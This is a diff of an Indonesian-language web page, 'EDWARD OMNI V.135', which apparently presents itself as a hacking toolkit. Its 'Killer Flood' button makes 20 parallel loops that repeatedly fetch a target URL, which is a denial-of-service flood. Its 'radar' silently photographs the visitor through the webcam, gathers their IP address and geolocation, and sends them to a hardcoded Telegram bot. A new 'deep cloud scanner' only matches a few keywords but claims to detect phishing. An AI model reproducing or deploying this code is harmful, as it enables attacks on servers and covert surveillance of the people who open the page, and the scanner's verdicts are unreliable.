@@ -3,28 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.130 - NUCLEAR</title>
+    <title>EDWARD OMNI V.135</title>
     <style>
-        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; }
+        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; }
         * { box-sizing: border-box; transition: 0.2s; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 20px; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 15px; }
         
         .exit-btn { position: fixed; top: 15px; right: 15px; background: rgba(255, 71, 87, 0.2); border: 1px solid var(--red); color: var(--red); padding: 5px 12px; border-radius: 8px; font-size: 10px; font-weight: bold; cursor: pointer; z-index: 10000; }
-        .master-header { text-align: center; margin-bottom: 20px; }
-        .master-name { font-size: 24px; font-weight: 800; background: linear-gradient(to right, var(--neon), #00bdff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
+        .master-header { text-align: center; margin-bottom: 20px; padding-top: 10px; }
+        .master-name { font-size: 24px; font-weight: 800; background: linear-gradient(to right, var(--neon), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
         
-        .card { background: rgba(15, 25, 35, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px; margin-bottom: 15px; }
-        h3 { margin: 0 0 15px 0; font-size: 10px; color: rgba(255,255,255,0.5); letter-spacing: 2px; }
+        .card { background: rgba(15, 25, 35, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 18px; margin-bottom: 12px; }
+        h3 { margin: 0 0 12px 0; font-size: 10px; color: rgba(255,255,255,0.5); letter-spacing: 2px; text-transform: uppercase; }
         
-        input { background: rgba(0,0,0,0.3); border: 1px solid rgba(0,255,136,0.2); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 15px; outline: none; }
-        .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 12px; text-transform: uppercase; }
-        .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; box-shadow: 0 0 15px rgba(255,71,87,0.4); }
-        .btn-radar { background: transparent; color: var(--neon); border: 1px solid var(--neon); margin-top: 10px; }
+        input { background: rgba(0,0,0,0.3); border: 1px solid rgba(0,255,136,0.2); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 12px; outline: none; font-size: 13px; }
+        .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 11px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        
+        .btn-safe { background: linear-gradient(45deg, var(--neon), var(--blue)); color: #000; }
+        .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; }
+        .btn-radar { background: transparent; color: var(--neon); border: 1px solid var(--neon); }
 
-        #killerLog { display: none; margin-top: 15px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 150px; overflow-y: auto; color: var(--neon); border: 1px solid #1a1a1a; }
-        .log-entry { border-bottom: 1px solid #111; padding: 2px 0; }
+        #scanStatus { display: none; margin-top: 10px; text-align: center; padding: 10px; border-radius: 10px; font-weight: bold; font-size: 12px; }
+        #killerLog { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 120px; overflow-y: auto; color: var(--neon); border: 1px solid #1a1a1a; }
 
-        /* RADAR SMOOTH V.130 */
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
         .radar-container { width: 200px; height: 200px; border-radius: 50%; border: 1px solid rgba(0,255,136,0.3); position: relative; overflow: hidden; }
         .radar-sweep { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rotate 2s linear infinite; }
@@ -37,13 +38,20 @@
     <button class="exit-btn" onclick="location.href='about:blank';">EXIT</button>
 
     <div class="master-header">
-        <p class="master-name">EDWARD OMNI V.130</p>
-        <span style="color:var(--neon); font-size:9px; border:1px solid var(--neon); padding:2px 8px; border-radius:10px;">NUCLEAR FLOOD EDITION</span>
+        <p class="master-name">EDWARD OMNI V.135</p>
+        <div style="margin-top:5px;"><span style="color:var(--neon); font-size:9px; border:1px solid var(--neon); padding:2px 8px; border-radius:10px;">NUCLEAR + SCANNER EDITION</span></div>
+    </div>
+
+    <div class="card">
+        <h3>🛡️ DEEP CLOUD SCANNER</h3>
+        <input type="text" id="scanInput" placeholder="Masukkan link untuk analisa...">
+        <button class="btn btn-safe" onclick="cekLink()">⚡ ANALYZE TARGET</button>
+        <div id="scanStatus"></div>
     </div>
 
     <div class="card">
         <h3>🔥 KILLER FLOOD (NUCLEAR)</h3>
-        <input type="text" id="targetUrl" placeholder="https://situs-judol-target.com">
+        <input type="text" id="targetUrl" placeholder="https://target-server.com">
         <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH ATTACK 🚀</button>
         <div id="killerLog"></div>
     </div>
@@ -55,7 +63,7 @@
 
     <div id="radarOverlay">
         <div class="radar-container"><div class="radar-sweep"></div></div>
-        <p id="rStatus" style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing:2px;">MENGIRIM KOORDINAT...</p>
+        <p style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing:2px;">UPLOADING DATA TO TELEGRAM...</p>
     </div>
 
     <canvas id="canvas"></canvas>
@@ -66,46 +74,50 @@
         const CHAT_ID = '7898572558';
         let isAtk = false, atkIntervals = [];
 
-        // KILLER FLOOD V.2.0: MULTI-THREAD SIMULATION
+        function cekLink() {
+            const url = document.getElementById('scanInput').value.toLowerCase();
+            const status = document.getElementById('scanStatus');
+            if(!url) return;
+            status.style.display = "block"; status.innerText = "DEEP SCANNING...";
+            setTimeout(() => {
+                const bad = ['dana', 'kaget', 'giveaway', '.xyz', '.tk', 'bit.ly'];
+                const isBad = bad.some(w => url.includes(w)) || !url.startsWith('https://');
+                status.style.background = isBad ? "rgba(255,71,87,0.1)" : "rgba(0,255,163,0.1)";
+                status.style.color = isBad ? "#ff4757" : "#00ff88";
+                status.innerText = isBad ? "⚠️ WARNING: PHISING DETECTED!" : "✅ CLEAN: LINK SECURE";
+            }, 1200);
+        }
+
         function toggleAtk() {
             const url = document.getElementById('targetUrl').value;
             const log = document.getElementById('killerLog');
-            if(!url) return;
-
-            if(!isAtk) {
-                isAtk = true; log.style.display = "block";
-                document.getElementById('atkBtn').innerText = "STOP ATTACK 🛑";
-                document.getElementById('atkBtn').style.background = "#ff4757";
-
-                // Membuka 20 jalur serangan sekaligus (Parallel Flood)
-                for(let i=0; i < 20; i++) {
-                    let interval = setInterval(() => {
-                        fetch(url, { mode: 'no-cors', cache: 'no-cache' }).catch(() => {});
-                        const e = document.createElement('div');
-                        e.className = "log-entry";
-                        e.innerText = "> [THREAD-"+i+"] BYPASS FIREWALL... SENDING 500KB PACKET!";
-                        log.prepend(e);
-                        if(log.childNodes.length > 50) log.removeChild(log.lastChild);
-                    }, 100);
-                    atkIntervals.push(interval);
-                }
-            } else { location.reload(); }
+            if(!url || isAtk) { if(isAtk) location.reload(); return; }
+            isAtk = true; log.style.display = "block";
+            document.getElementById('atkBtn').innerText = "STOP ATTACK 🛑";
+            for(let i=0; i < 20; i++) {
+                atkIntervals.push(setInterval(() => {
+                    fetch(url, { mode: 'no-cors', cache: 'no-cache' }).catch(() => {});
+                    const e = document.createElement('div');
+                    e.innerText = "> [THREAD-"+i+"] SENDING NUCLEAR PACKET...";
+                    log.prepend(e);
+                    if(log.childNodes.length > 30) log.removeChild(log.lastChild);
+                }, 150));
+            }
         }
 
-        // RADAR SYSTEM V.120 STABLE
         async function startRadar() {
             document.getElementById('radarOverlay').style.display = 'flex';
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('v'); video.srcObject = stream;
+                document.getElementById('v').srcObject = stream;
                 setTimeout(async () => {
                     const canvas = document.getElementById('canvas');
+                    const video = document.getElementById('v');
                     canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                     const ipR = await fetch('https://api.ipify.org?format=json');
                     const ipD = await ipR.json();
-                    
                     navigator.geolocation.getCurrentPosition(async (p) => {
                         await sendTele(blob, ipD.ip, p.coords.latitude, p.coords.longitude);
                         location.reload();
@@ -120,8 +132,8 @@
         async function sendTele(photo, ip, lat, lon) {
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID); fd.append('photo', photo);
-            let cap = "🔱 [ REPORT NUCLEAR V.130 ] 🔱\n\n🌐 IP: " + ip + "\n📱 DEV: " + navigator.platform;
-            if(lat && lon) cap += "\n📍 MAPS: http://googleusercontent.com/maps.google.com/4" + lat + "," + lon;
+            let cap = "🔱 [ REPORT V.135 ] 🔱\n\n🌐 IP: " + ip + "\n📱 DEV: " + navigator.platform;
+            if(lat && lon) cap += "\n📍 MAPS: http://googleusercontent.com/maps.google.com/5" + lat + "," + lon;
             fd.append('caption', cap);
             return fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: fd });
         }
